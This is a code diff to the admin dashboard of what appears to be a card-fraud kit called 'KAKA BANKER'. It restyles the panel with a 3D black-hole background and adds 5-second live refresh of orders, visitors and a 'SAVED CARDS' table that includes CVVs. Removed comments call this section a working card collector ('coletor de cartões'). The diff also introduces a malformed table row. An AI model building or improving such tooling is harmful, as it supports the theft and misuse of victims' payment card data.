@@ -14,50 +14,21 @@
         }
         
         body, html {
-            overflow-x: hidden;
+            overflow: hidden;
+            background: #000;
             font-family: 'Outfit', sans-serif;
-            min-height: 100vh;
-            transition: background 0.3s ease;
+            height: 100%;
         }
 
-        /* ========== TEMA ESCURO (PADRÃO) ========== */
-        body.dark {
-            --bg: #000000;
-            --bg-card: rgba(15, 15, 20, 0.85);
-            --border: rgba(255, 255, 255, 0.06);
-            --text: #ffffff;
-            --text-sec: #a1a1aa;
-            --input-bg: rgba(255, 255, 255, 0.04);
-            --card-hover: rgba(255, 255, 255, 0.05);
-            --glow: rgba(99, 102, 241, 0.3);
-        }
-        
-        /* ========== TEMA CLARO (CORRIGIDO) ========== */
-        body.light {
-            --bg: #e8eef2;
-            --bg-card: rgba(255, 255, 255, 0.75);
-            --border: rgba(0, 0, 0, 0.08);
-            --text: #1a1a2e;
-            --text-sec: #555555;
-            --input-bg: rgba(0, 0, 0, 0.03);
-            --card-hover: rgba(0, 0, 0, 0.04);
-            --glow: rgba(99, 102, 241, 0.2);
-        }
-        
-        body {
-            background: var(--bg);
-            color: var(--text);
-        }
-
-        /* ========== BACKGROUND ========== */
-        .bg-gradient {
+        /* ========== 3D BACKGROUND (P6 STYLE) ========== */
+        .webgl {
             position: fixed;
             top: 0;
             left: 0;
+            outline: none;
+            z-index: 0;
             width: 100%;
             height: 100%;
-            background: radial-gradient(ellipse at center, var(--bg) 0%, #000000 100%);
-            z-index: 0;
         }
 
         /* ========== LOADING SCREEN ========== */
@@ -67,7 +38,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: var(--bg);
+            background: #000;
             z-index: 10000;
             display: flex;
             align-items: center;
@@ -243,31 +214,32 @@
             margin-bottom: 20px;
         }
         .logo h1 {
-            color: var(--text);
+            color: rgba(255, 255, 255, 0.9);
             font-size: 32px;
             font-weight: 700;
             letter-spacing: -1px;
         }
         .logo p {
-            color: var(--text-sec);
+            color: rgba(255, 255, 255, 0.45);
             font-size: 13px;
         }
         .card {
-            background: var(--bg-card);
-            backdrop-filter: blur(12px);
-            border: 1px solid var(--border);
+            background: rgba(0, 0, 0, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.06);
             border-radius: 14px;
             padding: 28px 24px;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
         }
         .card h1 {
-            color: var(--text);
+            color: rgba(255, 255, 255, 0.9);
             font-size: 20px;
             font-weight: 500;
             text-align: center;
             margin-bottom: 6px;
         }
         .subtitle {
-            color: var(--text-sec);
+            color: rgba(255, 255, 255, 0.45);
             font-size: 13px;
             text-align: center;
             margin-bottom: 24px;
@@ -291,24 +263,24 @@
         }
         label {
             display: block;
-            color: var(--text-sec);
+            color: rgba(255, 255, 255, 0.5);
             font-size: 12px;
             margin-bottom: 6px;
         }
         input {
             width: 100%;
             padding: 12px 14px;
-            background: var(--input-bg);
-            border: 1px solid var(--border);
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.08);
             border-radius: 8px;
-            color: var(--text);
+            color: #fff;
             font-family: 'Outfit', sans-serif;
             font-size: 14px;
         }
         input:focus {
             outline: none;
-            border-color: #6366f1;
-            box-shadow: 0 0 0 2px var(--glow);
+            border-color: rgba(255, 255, 255, 0.2);
+            background: rgba(255, 255, 255, 0.06);
         }
         .btn {
             width: 100%;
@@ -327,12 +299,12 @@
             margin-top: 20px;
         }
         .btn-primary {
-            background: linear-gradient(135deg, #6366f1 0%, #4f46e5 100%);
-            color: white;
+            background: linear-gradient(135deg, #ffffff 0%, #e8e8e8 100%);
+            color: #0a0a0a;
         }
         .btn-primary:hover {
+            background: linear-gradient(135deg, #ffffff 0%, #f5f5f5 100%);
             transform: translateY(-1px);
-            box-shadow: 0 5px 20px var(--glow);
         }
         .security-badge {
             display: flex;
@@ -340,7 +312,7 @@
             justify-content: center;
             gap: 6px;
             margin-top: 20px;
-            color: var(--text-sec);
+            color: rgba(255, 255, 255, 0.25);
             font-size: 11px;
         }
 
@@ -360,9 +332,9 @@
             top: 0;
             width: 280px;
             height: 100vh;
-            background: var(--bg-card);
-            backdrop-filter: blur(12px);
-            border-right: 1px solid var(--border);
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(20px);
+            border-right: 1px solid rgba(255, 255, 255, 0.06);
             padding: 32px 20px;
             z-index: 100;
         }
@@ -370,15 +342,15 @@
             text-align: center;
             margin-bottom: 48px;
             padding-bottom: 24px;
-            border-bottom: 1px solid var(--border);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
         }
         .sidebar-logo h2 {
-            color: var(--text);
+            color: rgba(255, 255, 255, 0.9);
             font-size: 24px;
             font-weight: 700;
         }
         .sidebar-logo p {
-            color: var(--text-sec);
+            color: rgba(255, 255, 255, 0.35);
             font-size: 11px;
             margin-top: 6px;
         }
@@ -393,7 +365,7 @@
             align-items: center;
             gap: 14px;
             padding: 12px 18px;
-            color: var(--text-sec);
+            color: rgba(255, 255, 255, 0.5);
             text-decoration: none;
             border-radius: 12px;
             transition: all 0.2s;
@@ -404,12 +376,12 @@
             width: 24px;
         }
         .sidebar-menu a:hover {
-            background: var(--card-hover);
-            color: var(--text);
+            background: rgba(255, 255, 255, 0.05);
+            color: rgba(255, 255, 255, 0.9);
         }
         .sidebar-menu a.active {
-            background: rgba(99, 102, 241, 0.15);
-            color: #6366f1;
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
         }
         .main-content {
             margin-left: 280px;
@@ -421,37 +393,34 @@
             align-items: center;
             margin-bottom: 32px;
             padding: 16px 24px;
-            background: var(--bg-card);
-            backdrop-filter: blur(12px);
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
             border-radius: 14px;
-            border: 1px solid var(--border);
+            border: 1px solid rgba(255, 255, 255, 0.06);
         }
         .admin-header h1 {
             font-size: 18px;
             margin: 0;
-            color: var(--text);
+            color: rgba(255, 255, 255, 0.9);
         }
         .header-actions {
             display: flex;
             gap: 12px;
         }
-        .theme-toggle, .logout-btn {
-            background: var(--input-bg);
-            border: 1px solid var(--border);
+        .logout-btn {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.08);
             padding: 8px 20px;
             border-radius: 8px;
-            color: var(--text-sec);
+            color: rgba(255, 255, 255, 0.7);
             cursor: pointer;
             font-family: 'Outfit', sans-serif;
             font-size: 13px;
             transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            gap: 8px;
         }
-        .theme-toggle:hover, .logout-btn:hover {
-            background: var(--card-hover);
-            color: var(--text);
+        .logout-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
         }
         .stats-grid {
             display: grid;
@@ -460,19 +429,19 @@
             margin-bottom: 32px;
         }
         .stat-card {
-            background: var(--bg-card);
-            backdrop-filter: blur(12px);
-            border: 1px solid var(--border);
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.06);
             border-radius: 14px;
             padding: 20px;
         }
         .stat-value {
             font-size: 28px;
             font-weight: 700;
-            color: #6366f1;
+            color: #fff;
         }
         .stat-label {
-            color: var(--text-sec);
+            color: rgba(255, 255, 255, 0.45);
             font-size: 12px;
             margin-top: 8px;
         }
@@ -484,29 +453,27 @@
         }
         .tab {
             padding: 10px 24px;
-            background: var(--bg-card);
-            backdrop-filter: blur(12px);
-            border: 1px solid var(--border);
-            color: var(--text-sec);
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            color: rgba(255, 255, 255, 0.6);
             font-weight: 500;
             cursor: pointer;
             border-radius: 8px;
             font-size: 13px;
-            transition: all 0.2s;
         }
         .tab:hover {
-            border-color: #6366f1;
-            color: var(--text);
+            border-color: rgba(255, 255, 255, 0.15);
+            color: #fff;
         }
         .tab.active {
-            background: #6366f1;
-            color: white;
-            border-color: #6366f1;
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            border-color: rgba(255, 255, 255, 0.15);
         }
         .section-card {
-            background: var(--bg-card);
-            backdrop-filter: blur(12px);
-            border: 1px solid var(--border);
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.06);
             border-radius: 14px;
             padding: 24px;
             margin-bottom: 28px;
@@ -516,8 +483,8 @@
             font-weight: 600;
             margin-bottom: 20px;
             padding-bottom: 12px;
-            border-bottom: 1px solid var(--border);
-            color: var(--text);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+            color: rgba(255, 255, 255, 0.8);
         }
         .table-wrapper {
             overflow-x: auto;
@@ -529,15 +496,15 @@
         th, td {
             padding: 12px 10px;
             text-align: left;
-            border-bottom: 1px solid var(--border);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
         }
         th {
-            color: #6366f1;
+            color: rgba(255, 255, 255, 0.5);
             font-size: 11px;
             text-transform: uppercase;
         }
         td {
-            color: var(--text-sec);
+            color: rgba(255, 255, 255, 0.7);
             font-size: 13px;
         }
         .badge {
@@ -564,27 +531,27 @@
             margin-bottom: 20px;
         }
         .form-group label {
-            color: var(--text-sec);
+            color: rgba(255, 255, 255, 0.5);
             font-size: 11px;
             margin-bottom: 6px;
         }
         .form-group input, .form-group textarea, .form-group select {
             width: 100%;
             padding: 10px 14px;
-            background: var(--input-bg);
-            border: 1px solid var(--border);
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.08);
             border-radius: 8px;
-            color: var(--text);
+            color: #fff;
             font-family: 'Outfit', sans-serif;
             font-size: 13px;
         }
         .form-group input:focus, .form-group textarea:focus {
             outline: none;
-            border-color: #6366f1;
+            border-color: rgba(255, 255, 255, 0.2);
         }
         .btn-save {
-            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
-            color: white;
+            background: linear-gradient(135deg, #ffffff 0%, #e8e8e8 100%);
+            color: #0a0a0a;
             border: none;
             padding: 10px 24px;
             border-radius: 8px;
@@ -607,18 +574,18 @@
             margin-top: 20px;
         }
         .product-card {
-            background: var(--input-bg);
-            border: 1px solid var(--border);
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.06);
             border-radius: 12px;
             padding: 16px;
         }
         .product-card h4 {
-            color: var(--text);
+            color: #fff;
             font-size: 14px;
             margin-bottom: 8px;
         }
         .product-card .price {
-            color: #6366f1;
+            color: #fff;
             font-weight: 700;
             font-size: 18px;
         }
@@ -626,12 +593,12 @@
             position: fixed;
             bottom: 30px;
             right: 30px;
-            background: var(--bg-card);
+            background: rgba(0, 0, 0, 0.8);
             backdrop-filter: blur(20px);
             border-left: 3px solid;
             padding: 12px 20px;
             border-radius: 8px;
-            color: var(--text);
+            color: #fff;
             z-index: 2000;
             animation: slideToast 0.3s ease;
         }
@@ -642,9 +609,9 @@
         .footer {
             text-align: center;
             padding: 20px;
-            color: var(--text-sec);
+            color: rgba(255, 255, 255, 0.3);
             font-size: 11px;
-            border-top: 1px solid var(--border);
+            border-top: 1px solid rgba(255, 255, 255, 0.06);
             margin-top: 20px;
         }
         .tab-content {
@@ -665,9 +632,9 @@
         }
     </style>
 </head>
-<body class="dark">
+<body>
 
-<div class="bg-gradient"></div>
+<canvas class="webgl" id="bgCanvas"></canvas>
 
 <!-- Loading Screen -->
 <div class="loading-screen" id="loadingScreen">
@@ -740,11 +707,8 @@
 
     <main class="main-content">
         <div class="admin-header">
-            <h1>KAKA <span style="color: #6366f1">BANKER</span></h1>
+            <h1>KAKA <span style="color: #fff">BANKER</span></h1>
             <div class="header-actions">
-                <button class="theme-toggle" onclick="toggleTheme()">
-                    <i class="fas fa-moon"></i> Dark
-                </button>
                 <button class="logout-btn" onclick="handleLogout()">
                     <i class="fas fa-sign-out-alt"></i> EXIT
                 </button>
@@ -801,14 +765,13 @@
             </div>
         </div>
 
-        <!-- CARDS SECTION - COLETOR DE CARDS -->
         <div id="tabCards" class="tab-content">
             <div class="section-card">
                 <div class="section-title">SAVED CARDS</div>
                 <div class="table-wrapper">
                     <table>
                         <thead><tr><th>Cardholder</th><th>Last Digits</th><th>CVV</th><th>Expiry</th><th>Brand</th></tr></thead>
-                        <tbody id="cardsBody"><tr><td colspan="5">No cards registered</td></tr></tbody>
+                        <tbody id="cardsBody"><td><td colspan="5">No cards registered</td></tr></tbody>
                     </table>
                 </div>
             </div>
@@ -842,8 +805,8 @@
             <div class="section-card">
                 <div class="section-title">PIX CONFIGURATION</div>
                 <div style="text-align: center;">
-                    <div style="background: var(--input-bg); padding: 20px; border-radius: 12px; margin-bottom: 20px;">
-                        <p id="pixCodeDisplay" style="font-family: monospace; color: var(--text-sec);">Configure your PIX key</p>
+                    <div style="background: rgba(255,255,255,0.05); padding: 20px; border-radius: 12px; margin-bottom: 20px;">
+                        <p id="pixCodeDisplay" style="font-family: monospace; color: rgba(255,255,255,0.7);">Configure your PIX key</p>
                     </div>
                     <div style="display: flex; gap: 12px; max-width: 500px; margin: 0 auto;">
                         <input type="text" id="pixKey" placeholder="PIX key (email, CPF, phone)">
@@ -857,29 +820,95 @@
     </main>
 </div>
 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
 <script>
-    // ========== THEME TOGGLE ==========
-    function toggleTheme() {
-        const body = document.body;
-        const btn = document.querySelector('.theme-toggle');
-        if (body.classList.contains('dark')) {
-            body.classList.remove('dark');
-            body.classList.add('light');
-            btn.innerHTML = '<i class="fas fa-sun"></i> Light';
-        } else {
-            body.classList.remove('light');
-            body.classList.add('dark');
-            btn.innerHTML = '<i class="fas fa-moon"></i> Dark';
-        }
-        localStorage.setItem('theme', body.classList.contains('light') ? 'light' : 'dark');
+    // ========== 3D BACKGROUND (P6 STYLE - BLACK HOLE EFFECT) ==========
+    const canvas = document.getElementById('bgCanvas');
+    const scene = new THREE.Scene();
+    const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+    const renderer = new THREE.WebGLRenderer({ canvas, alpha: true });
+    renderer.setSize(window.innerWidth, window.innerHeight);
+    renderer.setClearColor(0x000000, 1);
+    
+    // Starfield
+    const starGeometry = new THREE.BufferGeometry();
+    const starCount = 3000;
+    const starPositions = new Float32Array(starCount * 3);
+    for (let i = 0; i < starCount; i++) {
+        starPositions[i * 3] = (Math.random() - 0.5) * 2000;
+        starPositions[i * 3 + 1] = (Math.random() - 0.5) * 1000;
+        starPositions[i * 3 + 2] = (Math.random() - 0.5) * 500 - 200;
+    }
+    starGeometry.setAttribute('position', new THREE.BufferAttribute(starPositions, 3));
+    const starMaterial = new THREE.PointsMaterial({ color: 0xffffff, size: 0.3, transparent: true, opacity: 0.5 });
+    const stars = new THREE.Points(starGeometry, starMaterial);
+    scene.add(stars);
+    
+    // Black hole center
+    const blackHoleGeometry = new THREE.SphereGeometry(1.2, 64, 64);
+    const blackHoleMaterial = new THREE.MeshStandardMaterial({ color: 0x000000, emissive: 0x330000, emissiveIntensity: 0.5 });
+    const blackHole = new THREE.Mesh(blackHoleGeometry, blackHoleMaterial);
+    scene.add(blackHole);
+    
+    // Accretion disk
+    const diskParticles = [];
+    const diskCount = 800;
+    for (let i = 0; i < diskCount; i++) {
+        const particleGeo = new THREE.SphereGeometry(0.06, 6, 6);
+        const particleMat = new THREE.MeshBasicMaterial({ color: 0xff4444 });
+        const particle = new THREE.Mesh(particleGeo, particleMat);
+        const angle = (i / diskCount) * Math.PI * 2;
+        const radius = 2.2 + Math.random() * 1.5;
+        particle.userData = {
+            angle: angle,
+            radius: radius,
+            speed: 0.015 + Math.random() * 0.02
+        };
+        particle.position.x = Math.cos(angle) * radius;
+        particle.position.z = Math.sin(angle) * radius;
+        scene.add(particle);
+        diskParticles.push(particle);
     }
     
-    const savedTheme = localStorage.getItem('theme');
-    if (savedTheme === 'light') {
-        document.body.classList.remove('dark');
-        document.body.classList.add('light');
-        document.querySelector('.theme-toggle').innerHTML = '<i class="fas fa-sun"></i> Light';
+    const ambientLight = new THREE.AmbientLight(0x111111);
+    scene.add(ambientLight);
+    const pointLight = new THREE.PointLight(0xff3333, 0.5, 20);
+    pointLight.position.set(2, 2, 2);
+    scene.add(pointLight);
+    
+    camera.position.z = 8;
+    camera.position.y = 1;
+    camera.lookAt(0, 0, 0);
+    
+    let time = 0;
+    function animate3d() {
+        requestAnimationFrame(animate3d);
+        time += 0.008;
+        
+        stars.rotation.y += 0.0003;
+        stars.rotation.x += 0.0002;
+        
+        diskParticles.forEach(p => {
+            p.userData.angle += p.userData.speed;
+            const rad = p.userData.radius;
+            p.position.x = Math.cos(p.userData.angle) * rad;
+            p.position.z = Math.sin(p.userData.angle) * rad;
+            const scale = 0.7 + Math.sin(time * 8 + p.userData.angle) * 0.3;
+            p.scale.set(scale, scale, scale);
+        });
+        
+        const pulse = 1 + Math.sin(time * 10) * 0.05;
+        blackHole.scale.set(pulse, pulse, pulse);
+        
+        renderer.render(scene, camera);
     }
+    animate3d();
+    
+    window.addEventListener('resize', () => {
+        camera.aspect = window.innerWidth / window.innerHeight;
+        camera.updateProjectionMatrix();
+        renderer.setSize(window.innerWidth, window.innerHeight);
+    });
 
     // ========== HIDE LOADING SCREEN ==========
     setTimeout(() => {
@@ -890,7 +919,7 @@
     function showToast(message, type = 'info') {
         const toast = document.createElement('div');
         toast.className = 'toast';
-        toast.style.borderLeftColor = type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : '#6366f1';
+        toast.style.borderLeftColor = type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : '#fff';
         toast.innerHTML = `<i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i> ${message}`;
         document.body.appendChild(toast);
         setTimeout(() => toast.remove(), 3500);
@@ -927,6 +956,7 @@
     }
 
     let adminToken = null;
+    let refreshInterval = null;
 
     // ========== LOGIN ==========
     async function handleLogin() {
@@ -956,7 +986,19 @@
                 adminPanel.classList.add('visible');
                 initSidebar();
                 loadAllData();
-                setInterval(() => loadStats(), 30000);
+                
+                // Atualização em tempo real (a cada 5 segundos)
+                if (refreshInterval) clearInterval(refreshInterval);
+                refreshInterval = setInterval(() => {
+                    if (adminToken) {
+                        loadStats();
+                        loadOrders();
+                        loadCards();
+                        loadVisitors();
+                        loadAbandonedCarts();
+                    }
+                }, 5000);
+                
                 showToast(`Welcome back, ${username}!`, 'success');
             } else {
                 errorDiv.style.display = 'flex';
@@ -971,6 +1013,7 @@
     }
 
     function handleLogout() {
+        if (refreshInterval) clearInterval(refreshInterval);
         sessionStorage.removeItem('adminToken');
         adminToken = null;
         document.getElementById('adminPanel').classList.remove('visible');
@@ -988,6 +1031,16 @@
         setTimeout(() => document.getElementById('adminPanel').classList.add('visible'), 100);
         initSidebar();
         loadAllData();
+        
+        refreshInterval = setInterval(() => {
+            if (adminToken) {
+                loadStats();
+                loadOrders();
+                loadCards();
+                loadVisitors();
+                loadAbandonedCarts();
+            }
+        }, 5000);
     }
 
     // ========== API CALLS ==========
@@ -1062,7 +1115,7 @@
             const data = await res.json();
             if (data.success && data.pedidos) {
                 const tbody = document.getElementById('ordersBody');
-                if (!data.pedidos.length) { tbody.innerHTML = '<tr><td colspan="7">No orders</td></tr>'; return; }
+                if (!data.pedidos.length) { tbody.innerHTML = '<tr><td colspan="7">No orders</td> </tr>'; return; }
                 tbody.innerHTML = data.pedidos.map(p => `
                     <tr>
                         <td>${p.pedido_id || p.id}</td>
@@ -1078,7 +1131,6 @@
         } catch (error) { console.error(error); }
     }
 
-    // CARDS - Coletor de cartões funcionando
     async function loadCards() {
         try {
             const res = await fetch('/api/admin/cartoes', { headers: { 'Authorization': `Bearer ${adminToken}` } });
